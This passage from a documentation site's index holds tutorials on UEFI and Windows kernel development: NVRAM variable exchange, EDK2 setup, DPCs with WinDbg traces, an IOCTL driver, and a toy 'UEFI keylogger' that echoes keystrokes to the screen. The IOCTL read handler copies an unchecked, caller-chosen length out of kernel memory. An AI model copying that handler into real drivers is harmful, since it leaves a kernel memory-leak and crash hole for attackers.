Content[x]); } return STATUS_SUCCESS; } In the project, we accessed the content of the our UEFI Variable with ExGetFirmwareEnvironmentVariable routine. Here‚Äôs result:\nWhen ExGetFirmwareEnvironmentVariable called, The following routines are called after the routine:\nFirst of all it calls¬†ExpGetFirmwareEnvironmentVariable:\nAnd then the parameters of the ExGetFirmwareEnvironmentVariable are passed to IoGetEnvironmentVariableEx:\nCreating UEFI Variable from Windows Driver Also we can create and set UEFI Variable from Windows Driver.¬†ExSetFirmwareEnvironmentVariable¬†can be used for these purpose:\n#include \u003cntddk.h\u003e #pragma warning(disable: 4057) #define EFI_VARIABLE_NON_VOLATILE 0x00000001 #define EFI_VARIABLE_BOOTSERVICE_ACCESS 0x00000002 #define EFI_VARIABLE_RUNTIME_ACCESS 0x00000004 NTSTATUS DriverUnload(PDRIVER_OBJECT DriverObject) { UNREFERENCED_PARAMETER(DriverObject); DbgPrintEx(0, 0, \"Driver unloaded.\\n\"); return STATUS_SUCCESS; } NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath) { UNREFERENCED_PARAMETER(RegistryPath); DriverObject-\u003eDriverUnload = DriverUnload; UNICODE_STRING VariableName = RTL_CONSTANT_STRING(L\"YUPIIIIIII\"); WCHAR Buffer[] = L\"HELLOOO from Windows!!\"; ULONG BufferSize = sizeof(Buffer); GUID VendorGuid = { 0xa1b2c3d4, 0x1234, 0x5678, {0x9a,0xbc,0xde,0xf1,0x23,0x45,0x67,0x89} }; NTSTATUS Status = STATUS_SUCCESS; UINT32 Attributes = EFI_VARIABLE_NON_VOLATILE | EFI_VARIABLE_BOOTSERVICE_ACCESS | EFI_VARIABLE_RUNTIME_ACCESS; Status = ExSetFirmwareEnvironmentVariable(\u0026VariableName, \u0026VendorGuid, \u0026Buffer, BufferSize, Attributes); if (!NT_SUCCESS(Status)) { DbgPrintEx(0, 0, \"Failed to write the value! Error Code: 0x%x\\n\", Status); return Status; } DbgPrintEx(0, 0, \"Done!\\n\"); return STATUS_SUCCESS; } And UEFI Driver:\n#include \u003cUefi.h\u003e #include \u003cLibrary/UefiApplicationEntryPoint.h\u003e #include \u003cLibrary/UefiLib.h\u003e #include \u003cLibrary/PcdLib.h\u003e #include \u003cLibrary/UefiBootServicesTableLib.h\u003e #include \u003cLibrary/UefiRuntimeServicesTableLib.h\u003e EFI_STATUS EFIAPI UefiMain(EFI_HANDLE ImageHandle, EFI_SYSTEM_TABLE *SystemTable) { CHAR16 *VariableName = L\"YUPIIIIIII\"; EFI_GUID VendorGuid = { 0xa1b2c3d4, 0x1234, 0x5678, {0x9a,0xbc,0xde,0xf1,0x23,0x45,0x67,0x89} }; CHAR16 Buffer[32]; UINTN DataSize = sizeof(Buffer); EFI_STATUS Status = EFI_SUCCESS; UINT32 Attributes = EFI_VARIABLE_NON_VOLATILE | EFI_VARIABLE_BOOTSERVICE_ACCESS | EFI_VARIABLE_RUNTIME_ACCESS; Status = gRT-\u003eGetVariable(VariableName, \u0026VendorGuid, \u0026Attributes, \u0026DataSize, \u0026Buffer); if (EFI_ERROR(Status)) { Print(L\"Failed to read the data!\\n\"); return Status; } Print(L\"The Content: %s\\n\", Buffer); return EFI_SUCCESS; } Here‚Äôs result:\nConclusion In this documentation, we demonstrated how UEFI and Windows drivers can communicate with each other using NVRAM variables. By leveraging SetVariable and GetVariable in UEFI, and ExGetFirmwareEnvironmentVariable / ExSetFirmwareEnvironmentVariable in Windows, we established a persistent and reliable data channel between the two environments.\nThis method enables developers to build seamless integrations between firmware and the OS, allowing for flexible configurations, feature toggles, or telemetry mechanisms across reboots.\nReferences UEFI.org - Runtime Services\nTianoCore Docs - GetVariable() and SetVariable()"},"title":"UEFI to Windows Communication via NVRAM Variables"},"/docs/uefi-dev/uefi-introduction/":{"data":{"":"","#":"","references#\u003cstrong\u003eReferences\u003c/strong\u003e":"Hello everyone. In this first document of UEFI Development, we will introduce the theory behind UEFI.\nWhat is UEFI? UEFI (Unified Extensible Firmware Interface) is a specification for a computer‚Äôs firmware. When the power button of a computer is pressed, UEFI runs before the operating system is started.\nWe can think of UEFI as an improved version of the old BIOS system. UEFI models also have basic I/O systems for interacting with hardware, but the system boot processes are different. UEFI uses GPT (Guid Partition Table). GPT is a modern standard that defines the layout of partitions on a computer‚Äôs storage device. It is the standard used in devices such as HDDs or SSDs that we are all familiar with. Just as UEFI replaced BIOS, GPT has replaced the previously used MBR (Master Boot Record) partitioning table. GPT works seamlessly with UEFI.\nThe advantages gained when combining UEFI and GPT are as follows:\nSupport for 2TB or larger disks Faster booting process Simplified development compared to the old BIOS So we can see that UEFI and GPT offer more advantages than older systems.\nUEFI has the same tasks as BIOS: running I/O devices and transferring control to the OS. However, its task is not limited to this, and as I mentioned above, it also offers a wide range of options for pre-OS development.\nLet‚Äôs take a look at the diagram below, which shows the difference between Legacy BIOS and UEFI:\nWhen we look at the diagram, we see that BIOS is firmware that communicates directly with hardware and is also hardware itself. When we look at UEFI in the diagram, we can see that it combines the interface between the hardware and the operating system. This function of UEFI makes things easier for developers.\nIn short, when we look at UEFI, we can see that it offers a more modern and faster process compared to the old Legacy BIOS, especially when used with GPT.\nUEFI Boot Process Let‚Äôs take a closer look at what happens in the background after pressing the power button on a UEFI computer, before the logo appears.\nUEFI has six main boot stages that are critical to the platform‚Äôs startup process:\nSecurity (SEC): The Security phase is the first stage of the UEFI boot process. Its main purpose is to initialize the Temporary RAM store, act as the system‚Äôs root of trust, and provide information to the Pre-EFI core phase. The mentioned root of trust works as follows: the SEC mechanism also serves as a system that ensures any code executed in the PI (Platform Initialization) is digitally signed, creating a Secure Boot environment. Pre-EFI Initialization (PEI): In the second stage, the execution of EFI code is enabled. Its primary responsibility is to load the DXE Foundation, which will initiate the DXE drivers in the next stage. It also uses processor resources to dispatch Pre-EFI Initialization Modules (PEIMs). These PEIMs handle critical processes such as initializing certain persistent memory components and ensuring the transition to the next stage ‚Äî the Driver Execution Environment (DXE). Driver Execution Environment (DXE): I think this stage is particularly important because major operations required to start the system occur here. In the PEI stage, the memory needed for DXE to operate is allocated and initialized. Once control is passed to DXE, the DXE Dispatcher is called. This Dispatcher is responsible for loading and executing hardware drivers, runtime services, and all boot services required for the operating system to start. In the context of our goal, as I mentioned earlier, this is a crucial stage ‚Äî our driver will be executed here. Boot Device Selection (BDS): After the DXE drivers have been executed, control is passed to BDS ‚Äî likely the stage you‚Äôve all seen before. Here, a selection is made as to which device the OS loader will be sought from. The operating system is then prepared for loading, and the process moves toward the Transient System Load (TSL) stage. Transient System Load (TSL): At this stage, the selected boot loader runs, and UEFI boot services are terminated. Runtime (RT): In this phase, the UEFI flow is handed over to the operating system. However, this does not mean UEFI disappears entirely. The Runtime Services belonging to UEFI remain available to support the OS. For hardware-specific tasks, the System Management Mode (SMM) comes into play. SMM is a secure mode in which the processor manages critical hardware functions independently of the operating system. For example, tasks such as adjusting fan speed or monitoring battery status are performed in this mode. If the OS cannot perform a certain hardware-related operation on its own, it sends a signal called SMI (System Management Interrupt) ‚Äî essentially a ‚Äúcall for help.‚Äù For instance, when the OS wants to control fan speed, it sends an SMI, SMM kicks in, and the task is handled there. Introduction to UEFI Development When it comes to sources for UEFI development, you‚Äôll really see that resources are limited. Popularly, the following tools can be used during the development process.\nEDK2: EDK2 is a toolset for UEFI and PI specifications with modern features like rich, cross‚Äëplatform coding. The EDK2 project is developed and maintained today by many of the developers who contribute to the UEFI specification (along with community volunteers). In this series, we‚Äôll use it for coding. Since EDK2 includes the latest UEFI protocols, it‚Äôs extremely useful. In addition, there are many projects we can use as guides during the learning process.- VisualUEFI: The VisualUEFI tool enables Windows users to develop EDK2 projects with the Visual Studio IDE. If you want to escape EDK2‚Äôs complex layout and work more comfortably, you can opt for this tool. Although I‚Äôm a Windows user, I won‚Äôt be using VisualUEFI in the serie. While VisualUEFI provides a comfortable environment for coding, I personally find it easier to manually work with project layouts like EDK2. If you want to install VisualUEFI, there are plenty of resources online.\nAfter we develop our projects, we‚Äôll need to simulate them. One of the following can be used:\nQEMU: You probably already know what QEMU is. Being an emulator rather than just a virtual machine, it offers good debugging capabilities and is a multi‚Äëplatform emulator. You can choose it in either Linux or Windows environments. VMware / VirtualBox: You can also use virtual machines such as VMware or VirtualBox. Setup EDK2 on Windows Before setting up the EDK2 project in Windows, we need to install the following tools:\nGit Python NASM Visual Studio First, let‚Äôs download Git, and then Python. Download Python directly from the original website instead of the Microsoft Store, and pay attention to the following during installation:\nDon‚Äôt forget to check the boxes in the area shown in the photo.\nNext, download NASM from its original website and run the downloaded .exe file as an administrator:\nDuring installation, set the location of the NASM project to C:\\NASM.\nAfter installing NASM, create a variable named NASM_PREFIX for User Variables in Windows‚Äô Environment Variables settings:\nLet‚Äôs set the value to C:\\NASM.\nNext, we need to install Visual Studio‚Äôs C++ tools. To download these tools, search for Build Tools on the Downloads page:\nLet‚Äôs download Tools for Visual Studio and then:\nSelect Desktop Development with C++ during installation and start the installation.\nOnce you have completed these steps, open cmd.exe and install the edk2 project:\ngit clone https://github.com/tianocore/edk2.git cd edk2 git submodule update --init After downloading the edk2 project, open the Developer Command Prompt VS 2022 tool and then go to the edk2 project we downloaded. Open Config/target.txt with Notepad:\nnotepad Conf\\target.txt In this .txt file, replace the values with the ones I show you below:\nACTIVE_PLATFORM = ShellPkg/ShellPkg.dsc ... TARGET = RELEASE ... TARGET_ARCH = X64 ... TOOL_CHAIN_TAG = VS2022 Change the values accordingly and save and close. Then run edksetup.bat:\n\u003e C:\\edk2\u003eedksetup.bat ... WORKSPACE = C:\\edk2 EDK_TOOLS_PATH = C:\\edk2\\BaseTools BASE_TOOLS_PATH = C:\\edk2\\BaseTools EDK_TOOLS_BIN = C:\\edk2\\BaseTools\\Bin\\Win32 CONF_PATH = C:\\edk2\\Conf PYTHON_COMMAND = py -3 PYTHONPATH = C:\\edk2\\BaseTools\\Source\\Python; !!! WARNING !!! NASM_PREFIX environment variable is not set Found nasm.exe, setting the environment variable to C:\\nasm\\ !!! WARNING !!! CLANG_BIN environment variable is not set !!! WARNING !!! No CYGWIN_HOME set, gcc build may not be used !!! Next, let‚Äôs go to the BaseTools directory to compile the tools:\n\u003e C:\\edk2\u003ecd BaseTools \u003e C:\\edk2\\BaseTools\u003enmake After compiling the tools, let‚Äôs return to the main directory and run the Build command:\n\u003e C:\\edk2\\BaseTools\u003ecd .. \u003e C:\\edk2\u003eBuild ... - Done - Build end time: 13:14:44, Jan.28 2025 Build total time: 00:02:03 Hello World with UEFI We now have everything we need to develop a UEFI driver. Let‚Äôs develop a simple project that outputs ‚ÄúHello UEFI World‚Äù. We can create the projects we will develop under the ShellPkg/Application directory.\nWhen developing a driver, in addition to a .c project, we also need to create an .inf file. This INF file provides the necessary information to create and package the module. In other words, we will provide the necessary information for packaging our driver.\nLet‚Äôs create a folder named HelloWorld under the edk2/ShellPkg/Application directory and then start coding our HelloWorld.c project:\n#include \u003cUefi.h\u003e #include \u003cLibrary/UefiApplicationEntryPoint.h\u003e #include \u003cLibrary/UefiLib.h\u003e #include \u003cLibrary/PcdLib.h\u003e EFI_STATUS EFIAPI UefiMain ( IN EFI_HANDLE ImageHandle, IN EFI_SYSTEM_TABLE *SystemTable ) { Print (L\"Hello UEFI World!\\n\"); return EFI_SUCCESS; } Aside from some details, the code will not seem foreign to us.\nFor the main function, we will write our code inside UefiMain. UefiMain is the entry point of UEFI drivers. Similar to the traditional main function, it is the entry point of a UEFI application. UefiMain takes two parameters:\nImageHandle: A unique identifier for the application, represented by the UEFI firmware. SystemTable: A data structure providing access to various services and tables defined in the UEFI system. When you look at the code more closely, you might have felt your hands shake a bit because of the syntax differences (for example, the space left between Print and the parentheses). At first, like me, you might think this is a syntax error ‚Äî but it‚Äôs not. It‚Äôs related to the C coding style used by the EDK2 community:\nThen let‚Äôs create another project called HelloWorld.inf:\n[Defines] INF_VERSION = 0x00010006 BASE_NAME = HelloWorld MODULE_TYPE = UEFI_APPLICATION VERSION_STRING = 1.0 ENTRY_POINT = UefiMain [Sources] HelloWorld.c [Packages] MdePkg/MdePkg.dec ShellPkg/ShellPkg.dec MdeModulePkg/MdeModulePkg.dec [LibraryClasses] UefiApplicationEntryPoint UefiLib PcdLib After coding the .inf file, everything is complete, but before moving on to compilation, we will need to add our project to /edk2/ShellPkg/ShellPkg.dsc:\n... [Components] # # Build all the libraries when building this package. # This helps developers test changes and how they affect the package. # ShellPkg/Library/UefiShellLib/UefiShellLib.inf ShellPkg/Library/UefiShellAcpiViewCommandLib/UefiShellAcpiViewCommandLib.inf ShellPkg/Library/UefiShellCommandLib/UefiShellCommandLib.inf ShellPkg/Library/UefiShellCEntryLib/UefiShellCEntryLib.inf ShellPkg/Library/UefiHandleParsingLib/UefiHandleParsingLib.inf ShellPkg/Library/UefiShellBcfgCommandLib/UefiShellBcfgCommandLib.inf ShellPkg/Library/UefiShellLevel1CommandsLib/UefiShellLevel1CommandsLib.inf ShellPkg/Library/UefiShellLevel2CommandsLib/UefiShellLevel2CommandsLib.inf ShellPkg/Library/UefiShellLevel3CommandsLib/UefiShellLevel3CommandsLib.inf ShellPkg/Library/UefiShellDriver1CommandsLib/UefiShellDriver1CommandsLib.inf ShellPkg/Library/UefiShellInstall1CommandsLib/UefiShellInstall1CommandsLib.inf ShellPkg/Library/UefiShellDebug1CommandsLib/UefiShellDebug1CommandsLib.inf ShellPkg/Library/UefiShellNetwork1CommandsLib/UefiShellNetwork1CommandsLib.inf ShellPkg/Library/UefiShellNetwork2CommandsLib/UefiShellNetwork2CommandsLib.inf ShellPkg/Application/HelloWorld/HelloWorld.inf As shown above, add your HelloWorld project under Components.\nNow let‚Äôs compile our project:\nBuild -m ShellPkg\\Application\\HelloWorld\\HelloWorld.inf Running the Driver I will be using the VMWare environment for simulation operations. If you are using VMware or VirtualBox like me, you will need a USB flash drive formatted with FAT32. After formatting with FAT32, create a directory named efi/boot on the USB flash drive.\nThere will be two shell files under the /edk2/Build/Shell/RELEASE_VS2022/X64 directory:\nCopy any of these to the efi/boot directory as bootx64.efi. Then copy the HelloWorld.efi file to the root directory.\nAfter these steps, the contents of the USB flash drive should be as follows:\nHelloWorld.efi efi boot bootx64.efi Let‚Äôs start the virtual machine and perform the following steps:\nRemovable Devices \u003e USB Flash Drive \u003e Click on the Connect option.\nRestart the virtual machine and press the DEL key at startup:\nSelect your USB flash drive from the Boot Manager screen. It‚Äôs that simple!\nNow let‚Äôs run our HelloWorld driver:\nConclusion In this first chapter of UEFI development, we explored both the theory and the practical steps needed to start building UEFI applications. We learned that UEFI is a modern replacement for the traditional BIOS, offering faster boot times, support for large drives through GPT, and a more flexible platform for pre‚ÄëOS development. The six-stage boot process‚Äîfrom SEC to Runtime‚Äîprovides a clear roadmap for how the system initializes, loads drivers, and eventually hands control to the operating system.\nReferences Wikipedia - UEFI Dabudabot - Beginning UEFI Development Secret Club - Introduction to UEFI: Part 1 Binary Ninja - Advanced UEFI Analysis with Binary Ninja "},"title":"Introduction to UEFI"},"/docs/uefi-dev/uefi-keylogger/":{"data":{"":"","#":"In this documentation we will develop simple uefi keylogger.\nCoding #include \u003cUefi.h\u003e #include \u003cLibrary/UefiApplicationEntryPoint.h\u003e #include \u003cLibrary/UefiLib.h\u003e EFI_STATUS EFIAPI UefiMain( EFI_HANDLE ImageHandle, EFI_SYSTEM_TABLE *SystemTable ) { EFI_SIMPLE_TEXT_INPUT_PROTOCOL *TextInput; EFI_INPUT_KEY Key; /* Protokole eri≈üim saƒüla */ TextInput = SystemTable-\u003eConIn; Print (L\"UEFI Keylogger!\\n\"); while(1) { TextInput-\u003eReadKeyStroke ( TextInput, \u0026Key ); if (Key.ScanCode == SCAN_ESC) { Print (L\"ESC Button Detected\\n\"); break; } if (Key.UnicodeChar != 0) { Print (L\"Pressed: %c\\n\", Key.UnicodeChar); } } return EFI_SUCCESS; } Now let‚Äôs take a look at the codes\nEFI_SIMPLE_TEXT_INPUT_PROTOCOL *TextInput; EFI_INPUT_KEY Key; We start by creating a pointer in our driver with the EFI_SIMPLE_TEXT_INPUT_PROTOCOL protocol. We will use this pointer to capture input from the keyboard. The EFI_SIMPLE_TEXT_INPUT_PROTOCOL protocol is a basic protocol that reads keyboard input.\nWe then create a variable of type EFI_INPUT_KEY to store the keys pressed from the keyboard in a variable.\nTextInput = SystemTable-\u003eConIn; In this section, we access EFI_SIMPLE_TEXT_INPUT_PROTOCOL. ConIn is a member variable for Console Input Protocol.\nwhile(1) { TextInput-\u003eReadKeyStroke ( TextInput, \u0026Key ); if (Key.ScanCode == SCAN_ESC) { Print (L\"ESC Button Detected\\n\"); break; } if (Key.UnicodeChar != 0) { Print (L\"Pressed: %c\\n\", Key.UnicodeChar); } } Now we start printing the pressed keys on the screen with a loop. With ReadKeyStroke we pass the pressed keys to the Key variable.\nIf the key pressed is the ESC (SCAN_ESC) key, the driver exits the loop. If it is not, then we print the pressed key on the screen.\nRunning the Driver Create the KeyLogger.inf file and paste the following codes:\n[Defines] INF_VERSION = 0x00010006 BASE_NAME = KeyLogger MODULE_TYPE = UEFI_APPLICATION VERSION_STRING = 1.0 ENTRY_POINT = UefiMain [Sources] KeyLogger.c [Packages] MdePkg/MdePkg.dec ShellPkg/ShellPkg.dec MdeModulePkg/MdeModulePkg.dec [LibraryClasses] UefiApplicationEntryPoint UefiLib Now build the project via this code:\nBuild -m ShellPkg\\Application\\KeyLogger\\KeyLogger.inf Here‚Äôs the result:\nConclusion In this documentation we have learned how to develop a simple Keylogger with a UEFI driver. I realize that the documentation is simple, but since we are new to UEFI projects, I think it would be nice to move forward with simple projects like this."},"title":"UEFI Keylogger"},"/docs/winkernel-dev/":{"data":{"":"You can check the following sections to review documentations related to Windows Kernel Development:\nDeferred Procedure Call\rSystem Service Descriptor Table\rVirtual Memory\rDevice Input and Output Control\rI/O request packets"},"title":"Windows Kernel Dev."},"/docs/winkernel-dev/wkd-dpc/":{"data":{"":"","#":"","analyze-with-windbg#\u003cstrong\u003eAnalyze with Windbg\u003c/strong\u003e":"","conclusions#\u003cstrong\u003eConclusions\u003c/strong\u003e":"","project#\u003cstrong\u003eProject\u003c/strong\u003e":"","references#\u003cstrong\u003eReferences\u003c/strong\u003e":" DPC DPC (Deferred Procedure Call) is a mechanism in windows kernel. It‚Äôs used to let the schedule a function to run later at a lower IRQL. In other words, it‚Äôs a way for Windows handle important work later. DPC is useful when an interrupt happens or system must respond very quickly. So, DPC allows to execute high-priority tasks, such as interrupt handler but lower-priority tasks for later execution.\nEach DPC is associated with DPC Object which created and initialized by the kernel. A device driver can issue a DPC request and then, the DPC request will added to end of DPC queue. The DPC Objects queued in DISPATCH_LEVEL of IRQL. Now we have to understand that what is ‚ÄòIRQL‚Äô.\nIRQL The term of ‚ÄòIRQL‚Äô (Interrupt Request Level) is that it is simply defines the current hardware priority at which a CPU runs at any given time. For this, there are maps that each hardware corresponds to specific request level. Here‚Äôs a map for X64:\nNumber Name 15 High/Profile 14 Inter-Processor Interrupt 13 Clock 12 Synch Device[n] . . Device[1] 2 Dispatch/DPC 1 APC 0 Passive/Low The current running thread is responsible for handling these interrupts that saves CPU state and processes Interrupt Service Routine (ISR) mapped to incoming IRQL. Each interrupt routine is listed in Interrupt Description Table (IDT). We can dump this table with Windbg:\nIn this confusing output, we can see vector numbers, address and ntoskrnl routines. For example, the vector 0x0 KiDivideErrorFaultShadow that is shadow of KiDivideErrorFault is called when a division operation is concluded with error from User Mode or Kernel Mode Space.\nAnother example, in further of the list, there‚Äôs CPU Clock :\nd1:\tfffff805d0cd2948 nt!HalpTimerClockInterrupt (KINTERRUPT fffff805d0f60a40) So, we can verify if its IRQL level correspond to 13th value from the X64 table:\nThe structure KINTERRUPT is kernel memory structure and it holds information about interrupt:\nkd\u003e dt _KINTERRUPT nt!_KINTERRUPT +0x000 Type : Int2B +0x002 Size : Int2B +0x008 InterruptListEntry : _LIST_ENTRY +0x018 ServiceRoutine : Ptr64 unsigned char ... In this output, the key member is ServiceRoutine at offset 0x18. This pointer holds the address of the Interrupt Service Routine (ISR) that will be executed when the associated interrupt is triggered.\nProject We will start with a simple project for DPC:\n#pragma warning(error:28251) #include \"main.h\" VOID DpcRoutine( _In_ struct _KDPC* Dpc, _In_ PVOID DeferredContext, _In_ PVOID SystemArgument1, _In_ PVOID SystemArgument2 ) { UNREFERENCED_PARAMETER(Dpc); UNREFERENCED_PARAMETER(DeferredContext); UNREFERENCED_PARAMETER(SystemArgument1); UNREFERENCED_PARAMETER(SystemArgument2); DbgPrintEx(0, 0, \"DPC routine executed\\n\"); } NTSTATUS DriverUnload(PDRIVER_OBJECT DriverObject) { UNREFERENCED_PARAMETER(DriverObject); DbgPrintEx(0, 0, \"Driver Unload\\n\"); return STATUS_SUCCESS; } NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath) { UNREFERENCED_PARAMETER(RegistryPath); DriverObject-\u003eDriverUnload = DriverUnload; DbgPrintEx(0, 0, \"Starting Driver...\\n\"); KDPC DpcObject; /* Initialize Dpc Object */ KeInitializeDpc(\u0026DpcObject, DpcRoutine, NULL); /* Queue the DPC */ KeInsertQueueDpc(\u0026DpcObject, NULL, NULL); return STATUS_SUCCESS; } In this code, we start by initializing our DPC Object with KeInitializeDpc:\nKDPC DpcObject; /* Initialize Dpc Object */ KeInitializeDpc(\u0026DpcObject, DpcRoutine, NULL); The structure KDPC is simply used for DPC Objects:\nkd\u003e dt _KDPC nt!_KDPC +0x000 TargetInfoAsUlong : Uint4B +0x000 Type : UChar +0x001 Importance : UChar +0x002 Number : Uint2B +0x008 DpcListEntry : _SINGLE_LIST_ENTRY +0x010 ProcessorHistory : Uint8B +0x018 DeferredRoutine : Ptr64 void +0x020 DeferredContext : Ptr64 Void +0x028 SystemArgument1 : Ptr64 Void +0x030 SystemArgument2 : Ptr64 Void +0x038 DpcData : Ptr64 Void The member key is DeferredRoutine. This member is taken address of DPC Routine. We can see this in the codes of KeInitializeDpc:\nThe rdx value holds the second parameter of KeInitializeDpc and taken the value to DPC+DeferredRoutine. The KDPC structure corresponds to 0x113 offset.\nAfter that, we insert our DPC Object to queue for DPC execution with KeInsertQueueDpc:\n/* Queue the DPC */ KeInsertQueueDpc(\u0026DpcObject, NULL, NULL); And then our DPC will be executed:\nA driver registers a routine for a device object by calling KeInitializeDpc, as we did in the project and the function will be create device object, and we can call KeInsertQueueDpc for queue Custom Dpc (Our Routine, such as DpcRoutine) to execution:\nThis figure can help us that understand the steps we take.\nAnalyze with Windbg Firstly, we will see DPC structure which we created. Add bp after KeInitializeDpc run:\nkd\u003e bp fffff805`75471074 kd\u003e g Starting Driver... Breakpoint 1 hit DPC!DriverEntry+0x44: fffff805`75471074 4533c0 xor r8d,r8d After that, we can check the DPC:\nkd\u003e r rcx rcx=ffffd10da1ebc6f0 kd\u003e dt _KDPC ffffd10da1ebc6f0 DPC!_KDPC +0x000 TargetInfoAsUlong : 0x113 +0x000 Type : 0x13 '' +0x001 Importance : 0x1 '' +0x002 Number : 0 +0x008 DpcListEntry : _SINGLE_LIST_ENTRY +0x010 ProcessorHistory : 0 +0x018 DeferredRoutine : 0xfffff805`75471000 void DPC!DpcRoutine+0 +0x020 DeferredContext : (null) +0x028 SystemArgument1 : 0x00000000`00040244 Void +0x030 SystemArgument2 : 0xffffd10d`a1ebc738 Void +0x038 DpcData : (null) Notice that 0x18 offset DeferredRoutine taken address of DpcRoutine. Now let‚Äôs set bp on DpcRoutine:\nkd\u003e bp 0xfffff805`75471000 kd\u003e p Breakpoint 3 hit DPC!DpcRoutine: fffff805`75471000 4c894c2420 mov qword ptr [rsp+20h],r9 kd\u003e k # Child-SP RetAddr Call Site 00 fffff805`70f71ac8 fffff805`decd000e DPC!DpcRoutine 01 fffff805`70f71ad0 fffff805`dedbca0b nt!KiExecuteAllDpcs+0x67e 02 fffff805`70f71d20 fffff805`df1136e5 nt!KiRetireDpcList+0x36b 03 fffff805`70f71fb0 fffff805`df11368f nt!KxSwapStacksAndRetireDpcList+0x5 04 ffffd10d`a1ebc3c0 fffff805`decb0c65 nt!KiPlatformSwapStacksAndCallReturn 05 ffffd10d`a1ebc3d0 fffff805`df112b1f nt!KiDispatchInterrupt+0x65 06 ffffd10d`a1ebc400 fffff805`dec99539 nt!KiDpcInterrupt+0x39f 07 ffffd10d`a1ebc590 fffff805`dec99371 nt!KiInsertQueueDpc+0x1b9 08 ffffd10d`a1ebc690 fffff805`75471084 nt!KeInsertQueueDpc+0x11 09 ffffd10d`a1ebc6d0 fffff805`7547122b DPC!DriverEntry+0x54 ... At this point in the execution, our custom DpcRoutine has been triggered by the Windows kernel. The call stack shows that the routine is being called as part of the system‚Äôs DPC dispatch process. Specifically, KiExecuteAllDpcs is invoking our DPC routine after retrieving it from the DPC queue.\nConclusions In this document, we took a close look at DPC and IRQL and then created a project. Through our debugging session with WinDbg, we were able to inspect the call stack and confirm that our custom DpcRoutine was correctly triggered via KiExecuteAllDpcs.\nThis document simply demonstrates what a DPC (Deferred Procedure Call) is and how it works in the Windows operating system. I briefly explained the concept of IRQL, showed how a DPC routine can be created in a basic driver project, and observed its execution using WinDbg.\nReferences Microsoft - Introduction to DPC objects Wikipedia - Deferred Procedure Call Offsec - IRQLs Close Encounters of the Rootkit Kind ired team - IDT Microsoft Docs - Registering and Queuing a CustomDpc Routine Microsoft Docs - Windows kernel opaque structures "},"title":"DPC"},"/docs/winkernel-dev/wkd-ioctl/":{"data":{"":"","#":"In this documentation, we will discuss IOCTL mechanism on Windows.\nWhat is IOCTL? I/O Control Codes (IOCTLs) are a mechanism used for communication between user-mode applications and drivers, or between drivers within a stack. I/O control codes are sent via IRPs (I/O Request Packets), as mentioned in the previous section. If you are not familiar with IRPs, click here to learn more about them.\nIn Windows, user-mode programs send IOCTL codes to drivers using the DeviceIoControl API. This API delivers the received IOCTL code to the driver through the IRP_MJ_DEVICE_CONTROL request. It‚Äôs important to note that this is not the only way the IOCTL mechanism is used. Advanced drivers can also generate requests using IRP_MJ_DEVICE_CONTROL or IRP_MJ_INTERNAL_DEVICE_CONTROL to send IOCTL requests to lower-level drivers in the stack.\nIOCTL codes can be custom-defined by driver developers, but Windows also provides a set of predefined codes for common operations. These standard IOCTL codes are intended to standardize and simplify communication between hardware and software components. For example, some IOCTL codes are used for general tasks such as querying device properties or initiating specific operations. Developers can customize these codes or define new ones according to their specific needs, providing flexibility and extensibility.\nCoding Kernel Mode Driver #include \"main.h\" #define TAG 'beko' #define IOCTL_MEM_ALLOCATE \\ CTL_CODE(FILE_DEVICE_UNKNOWN, 0x800, METHOD_BUFFERED, FILE_ANY_ACCESS) #define IOCTL_MEM_READ \\ CTL_CODE(FILE_DEVICE_UNKNOWN, 0x801, METHOD_BUFFERED, FILE_ANY_ACCESS) PVOID GlobalMemoryAddr = NULL; NTSTATUS IoCreateClose(PDEVICE_OBJECT DeviceObject, PIRP Irp) { UNREFERENCED_PARAMETER(DeviceObject); PIO_STACK_LOCATION Stack = IoGetCurrentIrpStackLocation(Irp); NTSTATUS status = STATUS_SUCCESS; switch (Stack-\u003eMajorFunction) { case IRP_MJ_CREATE: Irp-\u003eIoStatus.Status = STATUS_SUCCESS; break; case IRP_MJ_CLOSE: Irp-\u003eIoStatus.Status = STATUS_SUCCESS; break; default: status = STATUS_INVALID_DEVICE_REQUEST; break; } Irp-\u003eIoStatus.Information = 0; IoCompleteRequest(Irp, IO_NO_INCREMENT); return Irp-\u003eIoStatus.Status; } NTSTATUS IoControl(PDEVICE_OBJECT DeviceObject, PIRP Irp) { UNREFERENCED_PARAMETER(DeviceObject); PIO_STACK_LOCATION Stack = IoGetCurrentIrpStackLocation(Irp); PVOID Data = Irp-\u003eAssociatedIrp.SystemBuffer; PCHAR UserBuffer = (PCHAR)Data; ULONG OutLength = Stack-\u003eParameters.DeviceIoControl.OutputBufferLength; ULONG Length = Stack-\u003eParameters.DeviceIoControl.InputBufferLength; ULONG Tag = TAG; switch (Stack-\u003eParameters.DeviceIoControl.IoControlCode) { case IOCTL_MEM_ALLOCATE: if (NULL == UserBuffer || 0 == Length) { Irp-\u003eIoStatus.Status = STATUS_INVALID_PARAMETER; Irp-\u003eIoStatus.Information = 0; break; } DbgPrintEx(0, 0, \"Data from UserLand program: %.*s\", Length, UserBuffer); GlobalMemoryAddr = ExAllocatePool2(POOL_FLAG_NON_PAGED, Length, Tag); if (NULL == GlobalMemoryAddr) { Irp-\u003eIoStatus.Status = STATUS_INSUFFICIENT_RESOURCES; Irp-\u003eIoStatus.Information = 0; break; } RtlCopyMemory(GlobalMemoryAddr, UserBuffer, Length); Irp-\u003eIoStatus.Status = STATUS_SUCCESS; Irp-\u003eIoStatus.Information = Length; break; case IOCTL_MEM_READ: RtlCopyMemory(UserBuffer, GlobalMemoryAddr, OutLength); Irp-\u003eIoStatus.Status = STATUS_SUCCESS; Irp-\u003eIoStatus.Information = OutLength; break; default: Irp-\u003eIoStatus.Status = STATUS_INVALID_DEVICE_REQUEST; Irp-\u003eIoStatus.Information = 0; break; } IoCompleteRequest(Irp, IO_NO_INCREMENT); return Irp-\u003eIoStatus.Status; } NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath) { UNREFERENCED_PARAMETER(RegistryPath); UNICODE_STRING DeviceName = RTL_CONSTANT_STRING(L\"\\\\Device\\\\MyDevice\"); UNICODE_STRING SymName = RTL_CONSTANT_STRING(L\"\\\\??\\\\MyDevice\"); PDEVICE_OBJECT DeviceObject; NTSTATUS Status; Status = IoCreateDevice(DriverObject, 0, \u0026DeviceName, FILE_DEVICE_UNKNOWN, 0, FALSE, \u0026DeviceObject); if (!NT_SUCCESS(Status)) { DbgPrintEx(0, 